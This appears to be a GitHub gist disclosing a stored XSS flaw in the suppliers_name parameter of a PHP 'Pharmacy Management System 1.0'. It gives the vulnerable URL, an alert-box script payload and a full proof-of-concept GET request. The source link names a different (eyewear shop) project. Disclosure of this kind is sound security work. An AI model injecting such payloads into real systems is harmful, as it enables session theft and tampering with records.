
[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fhigordiego%2F93343006341d3799de0cb8912cc328ec)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fhigordiego%2F93343006341d3799de0cb8912cc328ec&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fhigordiego%2F93343006341d3799de0cb8912cc328ec) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fhigordiego%2F93343006341d3799de0cb8912cc328ec&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@higordiego](https://avatars.githubusercontent.com/u/10968610?s=64&v=4)](/higordiego)

# [higordiego](/higordiego)/**[xss\_persistencemanager\_edit\_medicine.md](/higordiego/93343006341d3799de0cb8912cc328ec)** Secret

Created
October 19, 2024 16:08

Show Gist options

* [Download ZIP](/higordiego/93343006341d3799de0cb8912cc328ec/archive/9ef4583964c5555d0aecb283a3bb496b29dca304.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fhigordiego%2F93343006341d3799de0cb8912cc328ec)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fhigordiego%2F93343006341d3799de0cb8912cc328ec)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/higordiego/93343006341d3799de0cb8912cc328ec.js&quot;&gt;&lt;/script&gt;
* Save higordiego/93343006341d3799de0cb8912cc328ec to your computer and use it in GitHub Desktop.

[Code](/higordiego/93343006341d3799de0cb8912cc328ec)
[Revisions
1](/higordiego/93343006341d3799de0cb8912cc328ec/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/higordiego/93343006341d3799de0cb8912cc328ec.js&quot;&gt;&lt;/script&gt;

Save higordiego/93343006341d3799de0cb8912cc328ec to your computer and use it in GitHub Desktop.

[Download ZIP](/higordiego/93343006341d3799de0cb8912cc328ec/archive/9ef4583964c5555d0aecb283a3bb496b29dca304.zip)

 [Raw](/higordiego/93343006341d3799de0cb8912cc328ec/raw/9ef4583964c5555d0aecb283a3bb496b29dca304/xss_persistencemanager_edit_medicine.md)

[**xss\_persistencemanager\_edit\_medicine.md**](#file-xss_persistencemanager_edit_medicine-md)

## **Stored XSS Vulnerability in Pharmacy Management System – Medicine Update**

---

## **Affected Version:**

* **Pharmacy Management System**: 1.0

## **Vulnerability Information:**

* **Vulnerability Type:** Stored Cross-Site Scripting (XSS)
* **Severity:** HIGH
* **Status:** Unpatched

## **Vulnerable URL:**

* `/php/manage_medicine.php?action=update&id=2&name=Crosin&packing=1&generic_name=Aaaaa32131&suppliers_name=aaa`

## **Vulnerability Description:**

A **stored XSS vulnerability** has been identified in the **Pharmacy Management System** version 1.0, specifically within the **medicine update functionality**. This vulnerability arises due to the absence of proper input sanitization in the `suppliers_name` parameter. An attacker can inject malicious JavaScript code, which will be **stored persistently** in the database and executed every time the medicine record is accessed.

Since the payload is executed whenever an administrator or user views or interacts with the affected page, this vulnerability can result in severe consequences, including:

* **Session hijacking**
* **Theft of sensitive data** (e.g., cookies, session tokens)
* **Privilege escalation** (e.g., gaining unauthorized access)
* **UI defacement or manipulation** (leading to phishing attacks)

This persistent XSS attack can cause long-term damage by enabling attackers to alter page behavior, steal credentials, and manipulate critical pharmaceutical records.

---

## **Proof of Concept (PoC):**

Below is a sample **malicious payload** injected into the `suppliers_name` parameter:

```
<script>alert('XSS');</script>
```

Once injected, the payload is stored in the system’s database. Each time the page displaying the medicine details is accessed, the script will trigger an alert, demonstrating the XSS. However, a more advanced attacker could use this technique to redirect users, exfiltrate sensitive data, or steal sessions.

---

## **PoC Request:**

```
GET /php/manage_medicine.php?action=update&id=2&name=Crosin&packing=1&generic_name=Aaaaa32131&suppliers_name=%3Cscript%3Ealert('XSS')%3C/script%3E HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=48068ce7875c00d88ca3aa2b9269b91f
Connection: keep-alive

```

After executing the above request, the malicious JavaScript will be embedded in the **suppliers\_name** field. Any subsequent access to the affected page will trigger the XSS payload, showcasing the vulnerability.

---

## **XSS Example:**

* [![Stored XSS Example](https://camo.githubusercontent.com/28125264b3ebad185d572e84b9231955bc55679accf9d2800a07234bf5fd4656/68747470733a2f2f692e6962622e636f2f6b30324d7173712f323032342d31302d31392d31322d32332d7873732d73746f726167652d6d616e6765722d637573746f6d65722e706e67)](https://camo.githubusercontent.com/28125264b3ebad185d572e84b9231955bc55679accf9d2800a07234bf5fd4656/68747470733a2f2f692e6962622e636f2f6b30324d7173712f323032342d31302d31392d31322d32332d7873732d73746f726167652d6d616e6765722d637573746f6d65722e706e67)
* [![Stored XSS Triggered](https://camo.githubusercontent.com/944e322d6ac4b68570ea182bb5358ecd6afcd9d1bb55aa49494ca86d88142d45/68747470733a2f2f692e6962622e636f2f64324b6e3772352f323032342d31302d31392d31322d32332d7873732d73746f726167652d6d616e616765722d637573746f6d6572322e706e67)](https://camo.githubusercontent.com/944e322d6ac4b68570ea182bb5358ecd6afcd9d1bb55aa49494ca86d88142d45/68747470733a2f2f692e6962622e636f2f64324b6e3772352f323032342d31302d31392d31322d32332d7873732d73746f726167652d6d616e616765722d637573746f6d6572322e706e67)

---

## **External Links:**

* [BurpSuite Request Image](https://ibb.co/P4Gt1v1)
* [Vulnerability Source](https://www.sourcecodester.com/php/16089/online-eyewear-shop-website-using-php-and-mysql-free-download.html)

---

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Fhigordiego%2F93343006341d3799de0cb8912cc328ec)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

